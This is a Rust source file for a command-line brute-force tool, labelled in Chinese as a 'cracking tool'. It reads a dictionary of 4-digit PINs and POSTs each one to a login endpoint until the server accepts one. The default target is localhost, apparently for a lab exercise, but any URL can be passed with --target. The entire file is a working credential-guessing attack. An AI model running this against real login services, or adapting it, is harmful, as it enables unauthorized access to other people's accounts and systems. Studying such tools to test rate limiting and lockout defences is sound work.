use reqwest::blocking::Client;
use std::env;
use std::fs;
use std::io::{self, BufRead};

fn parse_args() -> (String, String) {
    let args: Vec<String> = env::args().collect();

    let mut target = String::from("http://127.0.0.1:3000/login");
    let mut dict_path = String::from("pin_dict.txt");

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => {
                if i + 1 < args.len() {
                    target = args[i + 1].clone();
                    i += 2;
                } else {
                    eprintln!("错误：--target 后面必须跟一个地址");
                    std::process::exit(1);
                }
            }
            "--dict" => {
                if i + 1 < args.len() {
                    dict_path = args[i + 1].clone();
                    i += 2;
                } else {
                    eprintln!("错误：--dict 后面必须跟一个文件路径");
                    std::process::exit(1);
                }
            }
            "--help" => {
                println!("守夜者爆破工具 v1.0");
                println!("用法:");
                println!("  cargo run -- --target <URL> --dict <FILE>");
                println!("  --target  目标登录接口地址");
                println!("  --dict    字典文件路径");
                std::process::exit(0);
            }
            flag => {
                eprintln!("警告：不认识这个旗语 '{}'，跳过。", flag);
                i += 1;
            }
        }
    }

    (target, dict_path)
}

fn main() {
    let (target, dict_path) = parse_args();

    let client = Client::new();
    let pins = load_dict(&dict_path);

    println!("目标: {}", target);
    println!("字典: {}", dict_path);
    println!("字典加载完成，共 {} 个密码，开始爆破...", pins.len());

    for (i, pin) in pins.iter().enumerate() {
        print!("[{}] 正在尝试: {} ... ", i + 1, pin);

        match try_login(&client, pin, &target) {
            Ok(true) => {
                println!(">>> 门开了！正确的 PIN 码是: {} <<<", pin);
                break;
            }
            Ok(false) => println!("错。继续。"),
            Err(e) => println!("网络炸了: {}，跳过这个继续下一个。", e),
        }
    }
}

fn load_dict(path: &str) -> Vec<String> {
    let file = match fs::File::open(path) {
        Ok(f) => f,
        Err(_) => {
            eprintln!("字典呢？！文件 '{}' 打不开！", path);
            std::process::exit(1);
        }
    };

    let reader = io::BufReader::new(file);

    let mut pins = Vec::new();
    let mut total_lines = 0;
    let mut empty_lines = 0;
    let mut bad_lines = 0;
    let mut bad_examples: Vec<String> = Vec::new();

    for line in reader.lines() {
        total_lines += 1;

        let line = match line {
            Ok(l) => l,
            Err(e) => {
                eprintln!("警告：第 {} 行读不了，跳过。原因: {}", total_lines, e);
                continue;
            }
        };

        let pin = line.trim().to_string();

        if pin.is_empty() {
            empty_lines += 1;
            continue;
        }

        if pin.len() != 4 {
            bad_lines += 1;
            if bad_examples.len() < 5 {
                bad_examples.push(format!("'{}' ({}位)", pin, pin.len()));
            }
            continue;
        }

        if !pin.chars().all(|c| c.is_digit(10)) {
            bad_lines += 1;
            if bad_examples.len() < 5 {
                let non_digit: String = pin.chars().filter(|c| !c.is_digit(10)).collect();
                bad_examples.push(format!("'{}' (含非数字字符: '{}')", pin, non_digit));
            }
            continue;
        }

        pins.push(pin);
    }

    if pins.is_empty() {
        eprintln!("错误：文件 '{}' 里一个有效 PIN 码都没有！", path);
        eprintln!("请检查文件内容——每行一个 4 位数字密码。");
        std::process::exit(1);
    }

    eprintln!("--- 字典加载报告 ---");
    eprintln!(
        "文件: {} | 总行: {} | 有效: {} | 空行: {} | 无效: {}",
        path, total_lines, pins.len(), empty_lines, bad_lines
    );
    if bad_lines > 0 {
        for example in &bad_examples {
            eprintln!("  例: {}", example);
        }
    }
    eprintln!("---");

    pins
}

fn try_login(client: &Client, pin: &str, target: &str) -> Result<bool, reqwest::Error> {
    let response = client
        .post(target)
        .header("Content-Type", "application/json")
        .json(&serde_json::json!({"pin": pin}))
        .send()?;

    Ok(response.status().is_success())
}